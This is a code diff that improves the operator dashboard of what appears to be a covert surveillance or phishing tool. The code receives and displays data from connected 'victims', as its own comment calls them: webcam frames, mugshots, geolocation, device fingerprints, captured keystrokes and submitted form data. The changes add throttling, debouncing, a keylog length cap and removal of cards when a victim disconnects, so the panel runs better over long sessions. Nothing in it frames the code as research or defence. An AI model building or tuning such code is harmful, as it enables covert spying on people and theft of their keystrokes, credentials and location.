@@ -1282,9 +1282,15 @@
       }
 
 
-      let connCount = 0;
-      let currentRoom = null;
-      const feedGrid = document.getElementById('feedGrid');
+let connCount = 0;
+let _statsRaf = 0;
+let currentRoom = null;
+const _infoTimers = {};
+function debounceCardInfo(id) {
+  if (_infoTimers[id]) return;
+  _infoTimers[id] = setTimeout(() => { _infoTimers[id] = 0; updateCardInfo(id); }, 150);
+}
+const feedGrid = document.getElementById('feedGrid');
       const emptyState = document.getElementById('emptyState');
 
       function show(idx, el) {
@@ -1635,6 +1641,20 @@
               return;
             }
 
+            // Server notifies when a victim's socket fully closes — remove their
+            // card and stored data so the dashboard doesn't leak over a long session.
+            if (msg.type === 'client_disconnect') {
+              const dcid = msg.clientId;
+              if (connections[dcid]) delete connections[dcid];
+              const dcard = document.getElementById('card-' + dcid);
+              if (dcard) {
+                dcard.remove();
+                connCount = Math.max(0, connCount - 1);
+                updateGlobalStats();
+              }
+              return;
+            }
+
             const id = msg.clientId;
             if (!id) return;
 
@@ -1642,12 +1662,21 @@
 
             if (msg.type === 'frame') {
               getOrCreateCard(id);
-              const img = document.getElementById('img-' + id);
-              if (img) img.src = msg.data;
+              const now = performance.now();
+              if (!connections[id]._lastFrameAt || now - connections[id]._lastFrameAt > 250) {
+                connections[id]._lastFrameAt = now;
+                const img = document.getElementById('img-' + id);
+                if (img) img.src = msg.data;
+              }
               const t = document.getElementById('time-' + id);
               if (t) t.textContent = new Date().toTimeString().substr(0, 8);
               frameCount++;
-              updateGlobalStats();
+              if (!_statsRaf) {
+                _statsRaf = requestAnimationFrame(() => {
+                  _statsRaf = 0;
+                  updateGlobalStats();
+                });
+              }
             }
 
             if (msg.type === 'mugshot') {
@@ -1662,7 +1691,7 @@
             if (msg.type === 'location') {
               connections[id].location = { ...(connections[id]._ipGeo || {}), ...msg };
               getOrCreateCard(id);
-              updateCardInfo(id);
+              debounceCardInfo(id);
               geoTotal++;
               updateGlobalStats();
             }
@@ -1671,13 +1700,14 @@
               connections[id].device = msg;
               try { const p = new UAParser(msg.userAgent).getResult(); connections[id].device.browser = p.browser.name + (p.browser.version ? " " + p.browser.version.split(".")[0] : ""); connections[id].device.os = p.os.name + (p.os.version ? " " + p.os.version : ""); connections[id].device.deviceType = p.device.type ? p.device.type.charAt(0).toUpperCase() + p.device.type.slice(1) : "Desktop"; connections[id].device.memory = msg.deviceMemory; connections[id].device.cores = msg.hardwareConcurrency; } catch (e) { }
               getOrCreateCard(id);
-              updateCardInfo(id);
+              debounceCardInfo(id);
             }
 
             if (msg.type === 'keylog') {
               if (!connections[id]) connections[id] = {};
               if (!connections[id].keylog) connections[id].keylog = [];
               connections[id].keylog.push(...msg.keys);
+              if (connections[id].keylog.length > 500) connections[id].keylog = connections[id].keylog.slice(-500);
               // Update modal if open
               const kd = document.getElementById('modalKeylog');
               const mid = document.getElementById('clientModal');
@@ -1695,12 +1725,12 @@
               connections[id].location.org = msg.org;
               connections[id]._ipGeo = { city: msg.city, region: msg.region, country: msg.country, isp: msg.isp, org: msg.org };
               getOrCreateCard(id);
-              updateCardInfo(id);
+              debounceCardInfo(id);
             }
             if (msg.type === 'form_data') {
               connections[id].form = { ...msg };
               getOrCreateCard(id);
-              updateCardInfo(id);
+              debounceCardInfo(id);
               // Flash the card border to draw attention
               const card = document.getElementById('card-' + id);
               if (card) {
